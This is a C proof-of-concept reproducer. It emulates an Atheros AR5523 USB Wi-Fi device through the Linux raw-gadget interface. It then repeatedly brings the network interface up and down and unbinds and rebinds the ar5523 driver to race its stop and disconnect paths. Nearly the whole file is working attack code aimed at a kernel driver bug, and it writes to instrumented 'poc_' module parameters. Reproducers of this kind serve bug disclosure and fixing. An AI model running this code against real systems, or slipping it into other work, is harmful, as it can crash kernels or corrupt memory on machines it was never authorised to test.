// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <sys/types.h>

#include <linux/types.h>
#include <linux/usb/ch9.h>
#include <linux/sockios.h>
#include <net/if.h>

#define UDC_NAME_LENGTH_MAX 128

struct usb_raw_init {
	__u8 driver_name[UDC_NAME_LENGTH_MAX];
	__u8 device_name[UDC_NAME_LENGTH_MAX];
	__u8 speed;
};

enum usb_raw_event_type {
	USB_RAW_EVENT_INVALID = 0,
	USB_RAW_EVENT_CONNECT = 1,
	USB_RAW_EVENT_CONTROL = 2,
	USB_RAW_EVENT_SUSPEND = 3,
	USB_RAW_EVENT_RESUME = 4,
	USB_RAW_EVENT_RESET = 5,
	USB_RAW_EVENT_DISCONNECT = 6,
};

struct usb_raw_event {
	__u32 type;
	__u32 length;
	__u8 data[0];
};

struct usb_raw_ep_io {
	__u16 ep;
	__u16 flags;
	__u32 length;
	__u8 data[0];
};

#define USB_RAW_IOCTL_INIT		_IOW('U', 0, struct usb_raw_init)
#define USB_RAW_IOCTL_RUN		_IO('U', 1)
#define USB_RAW_IOCTL_EVENT_FETCH	_IOR('U', 2, struct usb_raw_event)
#define USB_RAW_IOCTL_EP0_WRITE		_IOW('U', 3, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP0_READ		_IOWR('U', 4, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_ENABLE		_IOW('U', 5, struct usb_endpoint_descriptor)
#define USB_RAW_IOCTL_EP_DISABLE	_IOW('U', 6, __u32)
#define USB_RAW_IOCTL_EP_WRITE		_IOW('U', 7, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_READ		_IOWR('U', 8, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_CONFIGURE		_IO('U', 9)
#define USB_RAW_IOCTL_VBUS_DRAW		_IOW('U', 10, __u32)
#define USB_RAW_IOCTL_EP0_STALL		_IO('U', 12)

#define AR5523_CMD_TX_PIPE	0x01
#define AR5523_DATA_TX_PIPE	0x02
#define AR5523_CMD_RX_PIPE	0x81
#define AR5523_DATA_RX_PIPE	0x82

#define WDCMSG_HOST_AVAILABLE		0x01
#define WDCMSG_TARGET_GET_CAPABILITY	0x04
#define WDCMSG_TARGET_GET_STATUS	0x06
#define WDCMSG_TARGET_START		0x08

#define AR5523_CMD_ID	1

#define ST_MAC_ADDR			11
#define ST_SERIAL_NUMBER		14
#define ST_WDC_TRANSPORT_CHUNK_SIZE	15

#define CMD_HDR_SIZE 32

#define WDCMSG_DEVICE_AVAIL		0x13

#define AR5523_DRV_DIR "/sys/bus/usb/drivers/ar5523"
#define POC_PARAM      "/sys/module/ar5523/parameters/"

static int raw_fd = -1;
static int ep_cmd_out = -1;
static int ep_data_out = -1;
static int ep_cmd_in = -1;
static int ep_data_in = -1;
static volatile int configured;
static char intf_name[128];

static void die(const char *msg)
{
	fprintf(stderr, "[-] %s: %s\n", msg, strerror(errno));
	exit(1);
}

static void logmsg(const char *fmt, ...)
{
	va_list ap;
	va_start(ap, fmt);
	vfprintf(stdout, fmt, ap);
	va_end(ap);
	fputc('\n', stdout);
	fflush(stdout);
}

static __u32 rd_be32(const void *p)
{
	const unsigned char *b = p;
	return ((__u32)b[0] << 24) | ((__u32)b[1] << 16) |
	       ((__u32)b[2] << 8) | b[3];
}

static void put_be32(void *p, __u32 v)
{
	unsigned char *b = p;
	b[0] = v >> 24;
	b[1] = v >> 16;
	b[2] = v >> 8;
	b[3] = v;
}

static int usb_raw_open(void)
{
	int fd = open("/dev/raw-gadget", O_RDWR);

	if (fd < 0) {

		FILE *f = fopen("/proc/misc", "r");
		int minor = -1;
		char name[64];
		int m;

		if (f) {
			while (fscanf(f, "%d %63s", &m, name) == 2) {
				if (!strcmp(name, "raw-gadget")) {
					minor = m;
					break;
				}
			}
			fclose(f);
		}
		if (minor >= 0) {
			unlink("/dev/raw-gadget");
			if (mknod("/dev/raw-gadget", S_IFCHR | 0600,
				  makedev(10, minor)) == 0)
				fd = open("/dev/raw-gadget", O_RDWR);
		}
	}
	if (fd < 0)
		die("open /dev/raw-gadget");
	return fd;
}

static void usb_raw_init_dev(int fd, const char *driver, const char *device,
			     int speed)
{
	struct usb_raw_init arg;

	memset(&arg, 0, sizeof(arg));
	strncpy((char *)arg.driver_name, driver, sizeof(arg.driver_name) - 1);
	strncpy((char *)arg.device_name, device, sizeof(arg.device_name) - 1);
	arg.speed = speed;
	if (ioctl(fd, USB_RAW_IOCTL_INIT, &arg) < 0)
		die("USB_RAW_IOCTL_INIT");
}

static int usb_raw_ep_enable(int fd, struct usb_endpoint_descriptor *desc)
{
	int rv = ioctl(fd, USB_RAW_IOCTL_EP_ENABLE, desc);

	if (rv < 0)
		die("USB_RAW_IOCTL_EP_ENABLE");
	return rv;
}

struct io_buf {
	struct usb_raw_ep_io inner;
	__u8 data[2048];
};

static int usb_raw_ep0_write(int fd, void *data, int len)
{
	struct io_buf io;

	memset(&io, 0, sizeof(io));
	io.inner.ep = 0;
	io.inner.flags = 0;
	io.inner.length = len;
	if (len)
		memcpy(io.data, data, len);
	return ioctl(fd, USB_RAW_IOCTL_EP0_WRITE, &io);
}

static int usb_raw_ep0_read(int fd, int len)
{
	struct io_buf io;

	memset(&io, 0, sizeof(io));
	io.inner.ep = 0;
	io.inner.flags = 0;
	io.inner.length = len;
	return ioctl(fd, USB_RAW_IOCTL_EP0_READ, &io);
}

static int usb_raw_ep_write(int fd, int ep, void *data, int len)
{
	struct io_buf io;

	memset(&io, 0, sizeof(io));
	io.inner.ep = ep;
	io.inner.flags = 0;
	io.inner.length = len;
	memcpy(io.data, data, len);
	return ioctl(fd, USB_RAW_IOCTL_EP_WRITE, &io);
}

static int usb_raw_ep_read(int fd, int ep, void *data, int len)
{
	struct io_buf io;
	int rv;

	memset(&io, 0, sizeof(io));
	io.inner.ep = ep;
	io.inner.flags = 0;
	io.inner.length = len;
	rv = ioctl(fd, USB_RAW_IOCTL_EP_READ, &io);
	if (rv > 0)
		memcpy(data, io.data, rv > len ? len : rv);
	return rv;
}

static int ep0_reply(int fd, struct usb_ctrlrequest *ctrl, void *data, int len)
{
	if ((ctrl->bRequestType & USB_DIR_IN) && ctrl->wLength) {
		if (len > ctrl->wLength)
			len = ctrl->wLength;
		return usb_raw_ep0_write(fd, data, len);
	}
	return usb_raw_ep0_read(fd, 0);
}

static struct usb_device_descriptor dev_desc = {
	.bLength = 18,
	.bDescriptorType = USB_DT_DEVICE,
	.bcdUSB = 0x0200,
	.bDeviceClass = 0xff,
	.bDeviceSubClass = 0xff,
	.bDeviceProtocol = 0xff,
	.bMaxPacketSize0 = 64,
	.idVendor = 0x0cf3,
	.idProduct = 0x0003,
	.bcdDevice = 0x0100,
	.iManufacturer = 1,
	.iProduct = 2,
	.iSerialNumber = 3,
	.bNumConfigurations = 1,
};

#define EP_MPS 512

static unsigned char cfg_desc[46];

static void build_config_descriptor(void)
{
	unsigned char *p = cfg_desc;
	int i;
	static const unsigned char eps[4] = { AR5523_CMD_TX_PIPE,
					      AR5523_DATA_TX_PIPE,
					      AR5523_CMD_RX_PIPE,
					      AR5523_DATA_RX_PIPE };

	p[0] = 9;
	p[1] = USB_DT_CONFIG;
	p[2] = sizeof(cfg_desc) & 0xff;
	p[3] = sizeof(cfg_desc) >> 8;
	p[4] = 1;
	p[5] = 1;
	p[6] = 0;
	p[7] = 0xc0;
	p[8] = 0x32;
	p += 9;

	p[0] = 9;
	p[1] = USB_DT_INTERFACE;
	p[2] = 0;
	p[3] = 0;
	p[4] = 4;
	p[5] = 0xff;
	p[6] = 0xff;
	p[7] = 0xff;
	p[8] = 0;
	p += 9;

	for (i = 0; i < 4; i++) {
		p[0] = 7;
		p[1] = USB_DT_ENDPOINT;
		p[2] = eps[i];
		p[3] = USB_ENDPOINT_XFER_BULK;
		p[4] = EP_MPS & 0xff;
		p[5] = EP_MPS >> 8;
		p[6] = 0;
		p += 7;
	}
}

static int build_string_desc(unsigned char *buf, int idx)
{
	const char *s;
	int i, len;

	if (idx == 0) {
		buf[0] = 4;
		buf[1] = USB_DT_STRING;
		buf[2] = 0x09;
		buf[3] = 0x04;
		return 4;
	}
	switch (idx) {
	case 1:
		s = "Atheros";
		break;
	case 2:
		s = "AR5523";
		break;
	default:
		s = "0123456789";
		break;
	}
	len = strlen(s);
	buf[0] = 2 + 2 * len;
	buf[1] = USB_DT_STRING;
	for (i = 0; i < len; i++) {
		buf[2 + 2 * i] = s[i];
		buf[3 + 2 * i] = 0;
	}
	return buf[0];
}

static void *cmd_thread(void *arg)
{
	unsigned char req[2048];
	unsigned char rep[512];
	(void)arg;

	for (;;) {
		int n = usb_raw_ep_read(raw_fd, ep_cmd_out, req, 1024);
		__u32 code, which;
		int replylen = 0;

		if (n < 0) {
			usleep(20000);
			continue;
		}
		if (n < CMD_HDR_SIZE)
			continue;

		code = rd_be32(req + 4) & 0xff;

		memset(rep, 0, sizeof(rep));

		*(__u32 *)(rep + 8) = AR5523_CMD_ID;
		put_be32(rep + 4, code);

		switch (code) {
		case WDCMSG_HOST_AVAILABLE:

			put_be32(rep + 0, CMD_HDR_SIZE);
			replylen = CMD_HDR_SIZE;
			break;

		case WDCMSG_TARGET_GET_CAPABILITY:
			put_be32(rep + 0, CMD_HDR_SIZE + 4 + 4);
			put_be32(rep + CMD_HDR_SIZE, 4);
			put_be32(rep + CMD_HDR_SIZE + 4, 0);
			replylen = CMD_HDR_SIZE + 8;
			break;

		case WDCMSG_TARGET_GET_STATUS:
			which = (n >= CMD_HDR_SIZE + 4) ?
				rd_be32(req + CMD_HDR_SIZE) : 0;
			if (which == ST_MAC_ADDR) {
				put_be32(rep + 0, CMD_HDR_SIZE + 4 + 6);
				put_be32(rep + CMD_HDR_SIZE, 6);
				rep[CMD_HDR_SIZE + 4 + 0] = 0x02;
				rep[CMD_HDR_SIZE + 4 + 1] = 0x11;
				rep[CMD_HDR_SIZE + 4 + 2] = 0x22;
				rep[CMD_HDR_SIZE + 4 + 3] = 0x33;
				rep[CMD_HDR_SIZE + 4 + 4] = 0x44;
				rep[CMD_HDR_SIZE + 4 + 5] = 0x55;
				replylen = CMD_HDR_SIZE + 4 + 8;
			} else if (which == ST_SERIAL_NUMBER) {
				put_be32(rep + 0, CMD_HDR_SIZE + 4 + 16);
				put_be32(rep + CMD_HDR_SIZE, 16);
				memcpy(rep + CMD_HDR_SIZE + 4,
				       "AR5523-POC-0001", 16);
				replylen = CMD_HDR_SIZE + 4 + 16;
			} else if (which == ST_WDC_TRANSPORT_CHUNK_SIZE) {
				put_be32(rep + 0, CMD_HDR_SIZE + 4 + 4);
				put_be32(rep + CMD_HDR_SIZE, 4);
				put_be32(rep + CMD_HDR_SIZE + 4, 1024);
				replylen = CMD_HDR_SIZE + 8;
			} else {
				put_be32(rep + 0, CMD_HDR_SIZE + 4 + 4);
				put_be32(rep + CMD_HDR_SIZE, 4);
				put_be32(rep + CMD_HDR_SIZE + 4, 0);
				replylen = CMD_HDR_SIZE + 8;
			}
			break;

		case WDCMSG_TARGET_START:

			put_be32(rep + 0, CMD_HDR_SIZE + 4);
			put_be32(rep + CMD_HDR_SIZE, 0x1234);
			replylen = CMD_HDR_SIZE + 4;
			break;

		default:

			replylen = 0;
			break;
		}

		if (replylen)
			usb_raw_ep_write(raw_fd, ep_cmd_in, rep, replylen);
	}
	return NULL;
}

static void *data_thread(void *arg)
{

	unsigned char pkt[96];
	(void)arg;

	memset(pkt, 0, sizeof(pkt));
	pkt[0] = 0;
	pkt[1] = 0;

	for (;;) {
		int rv = usb_raw_ep_write(raw_fd, ep_data_in, pkt, sizeof(pkt));

		if (rv < 0)
			usleep(5000);
	}
	return NULL;
}

static int find_ar5523_intf(char *out, int outlen)
{
	DIR *d = opendir(AR5523_DRV_DIR);
	struct dirent *e;
	int found = 0;

	if (!d)
		return 0;
	while ((e = readdir(d))) {
		if (strchr(e->d_name, ':')) {
			snprintf(out, outlen, "%s", e->d_name);
			found = 1;
			break;
		}
	}
	closedir(d);
	return found;
}

static int find_our_wlan(const char *usbintf, char *out, int outlen)
{
	DIR *d = opendir("/sys/class/net");
	struct dirent *e;
	int found = 0;

	if (!d)
		return 0;
	while ((e = readdir(d))) {
		char path[512], link[512], *base;
		int n;

		if (e->d_name[0] == '.')
			continue;
		snprintf(path, sizeof(path), "/sys/class/net/%s/device",
			 e->d_name);
		n = readlink(path, link, sizeof(link) - 1);
		if (n <= 0)
			continue;
		link[n] = 0;
		base = strrchr(link, '/');
		base = base ? base + 1 : link;
		if (!strcmp(base, usbintf)) {
			snprintf(out, outlen, "%s", e->d_name);
			found = 1;
			break;
		}
	}
	closedir(d);
	return found;
}

static int iface_up(const char *name)
{
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	int rv;

	if (s < 0)
		return -1;
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, IFNAMSIZ, "%s", name);
	if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) {
		close(s);
		return -1;
	}
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	rv = ioctl(s, SIOCSIFFLAGS, &ifr);
	close(s);
	return rv;
}

static int iface_down(const char *name)
{
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	int rv;

	if (s < 0)
		return -1;
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, IFNAMSIZ, "%s", name);
	if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) {
		close(s);
		return -1;
	}
	ifr.ifr_flags &= ~IFF_UP;
	rv = ioctl(s, SIOCSIFFLAGS, &ifr);
	close(s);
	return rv;
}

static int sysfs_write(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);
	int rv;

	if (fd < 0)
		return -1;
	rv = write(fd, val, strlen(val));
	close(fd);
	return rv;
}

static void preload_completions(int n)
{
	unsigned char msg[CMD_HDR_SIZE];
	int i, sent = 0;

	memset(msg, 0, sizeof(msg));
	put_be32(msg + 0, CMD_HDR_SIZE);
	put_be32(msg + 4, WDCMSG_DEVICE_AVAIL);
	*(__u32 *)(msg + 8) = AR5523_CMD_ID;

	for (i = 0; i < n * 4 && sent < n; i++) {
		int rv = usb_raw_ep_write(raw_fd, ep_cmd_in, msg, sizeof(msg));

		if (rv < 0) {
			usleep(2000);
			continue;
		}
		sent++;
	}
	logmsg("[+] pre-loaded %d completions", sent);
}

static void *race_thread(void *arg)
{
	char wlan[64];
	int round;
	(void)arg;

	for (round = 0; round < 400; round++) {
		if (find_ar5523_intf(intf_name, sizeof(intf_name)))
			break;
		usleep(50000);
	}
	if (!intf_name[0]) {
		logmsg("[-] ar5523 never bound the emulated device");
		return NULL;
	}
	logmsg("[+] ar5523 bound to USB interface %s", intf_name);

	for (round = 0; round < 40; round++) {
		int i;

		wlan[0] = 0;
		for (i = 0; i < 200; i++) {
			if (find_our_wlan(intf_name, wlan, sizeof(wlan)))
				break;
			usleep(50000);
		}
		if (!wlan[0]) {
			logmsg("[-] round %d: no netdev for %s", round,
			       intf_name);
			return NULL;
		}

		logmsg("[+] round %d: %s -> %s, bringing up", round,
		       intf_name, wlan);
		if (iface_up(wlan) < 0)
			logmsg("[!] SIOCSIFFLAGS on %s failed: %s", wlan,
			       strerror(errno));

		sleep(3);

		logmsg("[+] round %d: pre-loading tx_cmd.done", round);
		preload_completions(24);

		if (sysfs_write(POC_PARAM "poc_done", "0") < 0 ||
		    sysfs_write(POC_PARAM "poc_armed", "0") < 0 ||
		    sysfs_write(POC_PARAM "poc_state", "1") < 0) {
			logmsg("[-] cannot write %s (built-in ar5523?)",
			       POC_PARAM "poc_state");
			return NULL;
		}

		logmsg("[+] round %d: ifdown -> ar5523_stop()", round);
		if (iface_down(wlan) < 0)
			logmsg("[!] ifdown %s failed: %s", wlan,
			       strerror(errno));

		logmsg("[+] round %d: unbind -> ar5523_disconnect()", round);
		if (sysfs_write(AR5523_DRV_DIR "/unbind", intf_name) < 0)
			logmsg("[!] unbind write failed: %s", strerror(errno));

		sleep(8);

		logmsg("[+] round %d: rebind for another attempt", round);
		if (sysfs_write(AR5523_DRV_DIR "/bind", intf_name) < 0)
			logmsg("[!] bind write failed: %s", strerror(errno));
		sleep(2);
	}
	logmsg("[-] gave up after 40 rounds");
	return NULL;
}

static void handle_control(int fd, struct usb_ctrlrequest *ctrl)
{
	unsigned char buf[512];
	int len = 0;

	if ((ctrl->bRequestType & USB_TYPE_MASK) != USB_TYPE_STANDARD) {
		ioctl(fd, USB_RAW_IOCTL_EP0_STALL, 0);
		return;
	}

	switch (ctrl->bRequest) {
	case USB_REQ_GET_DESCRIPTOR:
		switch (ctrl->wValue >> 8) {
		case USB_DT_DEVICE:
			memcpy(buf, &dev_desc, 18);
			len = 18;
			break;
		case USB_DT_CONFIG:
			memcpy(buf, cfg_desc, sizeof(cfg_desc));
			len = sizeof(cfg_desc);
			break;
		case USB_DT_STRING:
			len = build_string_desc(buf, ctrl->wValue & 0xff);
			break;
		default:
			ioctl(fd, USB_RAW_IOCTL_EP0_STALL, 0);
			return;
		}
		ep0_reply(fd, ctrl, buf, len);
		break;

	case USB_REQ_SET_CONFIGURATION: {
		struct usb_endpoint_descriptor ed;
		pthread_t t;

		if (!configured) {
			memset(&ed, 0, sizeof(ed));
			ed.bLength = 7;
			ed.bDescriptorType = USB_DT_ENDPOINT;
			ed.bmAttributes = USB_ENDPOINT_XFER_BULK;
			ed.wMaxPacketSize = EP_MPS;

			ed.bEndpointAddress = AR5523_CMD_TX_PIPE;
			ep_cmd_out = usb_raw_ep_enable(fd, &ed);
			ed.bEndpointAddress = AR5523_DATA_TX_PIPE;
			ep_data_out = usb_raw_ep_enable(fd, &ed);
			ed.bEndpointAddress = AR5523_CMD_RX_PIPE;
			ep_cmd_in = usb_raw_ep_enable(fd, &ed);
			ed.bEndpointAddress = AR5523_DATA_RX_PIPE;
			ep_data_in = usb_raw_ep_enable(fd, &ed);

			logmsg("[+] eps: cmd_out=%d data_out=%d cmd_in=%d data_in=%d",
			       ep_cmd_out, ep_data_out, ep_cmd_in, ep_data_in);

			ioctl(fd, USB_RAW_IOCTL_VBUS_DRAW, 0x32);
			if (ioctl(fd, USB_RAW_IOCTL_CONFIGURE, 0) < 0)
				die("USB_RAW_IOCTL_CONFIGURE");

			configured = 1;
			pthread_create(&t, NULL, cmd_thread, NULL);
			pthread_create(&t, NULL, data_thread, NULL);
			pthread_create(&t, NULL, race_thread, NULL);
		}
		ep0_reply(fd, ctrl, NULL, 0);
		break;
	}

	case USB_REQ_GET_CONFIGURATION:
		buf[0] = 1;
		ep0_reply(fd, ctrl, buf, 1);
		break;

	case USB_REQ_GET_INTERFACE:
		buf[0] = 0;
		ep0_reply(fd, ctrl, buf, 1);
		break;

	case USB_REQ_GET_STATUS:
		buf[0] = 1;
		buf[1] = 0;
		ep0_reply(fd, ctrl, buf, 2);
		break;

	case USB_REQ_SET_INTERFACE:
	case USB_REQ_SET_ADDRESS:
	case USB_REQ_CLEAR_FEATURE:
	case USB_REQ_SET_FEATURE:
		ep0_reply(fd, ctrl, NULL, 0);
		break;

	default:
		ioctl(fd, USB_RAW_IOCTL_EP0_STALL, 0);
		break;
	}
}

int main(void)
{
	struct {
		struct usb_raw_event inner;
		struct usb_ctrlrequest ctrl;
	} event;

	setvbuf(stdout, NULL, _IONBF, 0);
	build_config_descriptor();

	raw_fd = usb_raw_open();
	usb_raw_init_dev(raw_fd, "dummy_udc", "dummy_udc.0", USB_SPEED_HIGH);
	if (ioctl(raw_fd, USB_RAW_IOCTL_RUN, 0) < 0)
		die("USB_RAW_IOCTL_RUN");

	logmsg("[+] raw-gadget running, emulating AR5523 (0cf3:0003)");

	for (;;) {
		memset(&event, 0, sizeof(event));
		event.inner.type = 0;
		event.inner.length = sizeof(event.ctrl);
		if (ioctl(raw_fd, USB_RAW_IOCTL_EVENT_FETCH, &event) < 0) {
			if (errno == EINTR)
				continue;
			logmsg("[!] EVENT_FETCH: %s", strerror(errno));
			sleep(1);
			continue;
		}
		switch (event.inner.type) {
		case USB_RAW_EVENT_CONNECT:
			logmsg("[+] connect");
			break;
		case USB_RAW_EVENT_CONTROL:
			handle_control(raw_fd, &event.ctrl);
			break;
		default:
			break;
		}
	}
	return 0;
}
